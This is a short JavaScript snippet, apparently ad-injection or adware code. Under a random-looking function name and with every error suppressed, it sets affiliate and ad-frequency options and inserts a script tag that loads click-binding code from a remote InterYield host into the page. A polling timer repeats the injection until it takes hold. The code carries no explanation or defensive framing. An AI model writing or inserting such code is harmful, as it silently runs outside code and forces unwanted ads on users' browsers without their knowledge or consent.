

ydlDwscBrjVyKdm = function() {
    try {
            InterYieldOptions= [{
   "e": "click",
   "debug": "false",
   "affiliate": "harel777",
   "subid": "UjBvPQ==",
   "ecpm": "0",
   "snoozeMinutes": "2",
   "maxAdCountsPerInterval": "6",
   "adCountIntervalHours": "24",
   "attributionLogo": "custom attribution",
   "attributionTitle": "custom attribution title",
   "attributionLink": "custom attribution link",
   "EndPoint": "http://interyield.jmp9.com"
}] ;
            InterYieldScript = document.createElement("script");
            InterYieldScript.type = "text/javascript";
            InterYieldScript.src = "http://interyield.jmp9.com/InterYield/clickbinder.do?ver=1.0-SNAPSHOT.8%2C855&a=null";
            document.getElementsByTagName("head")[0].appendChild(InterYieldScript);
            delete InterYieldScript;
    } catch (e) { }
};




(function myLoop (i) {  
    setTimeout(function () {   
        if (typeof InterYieldOptions == "undefined" || InterYieldOptions == null ) {
            ydlDwscBrjVyKdm();
            return;
        }
        if (--i) myLoop(i);    
    }, 300)
})(30); 

      

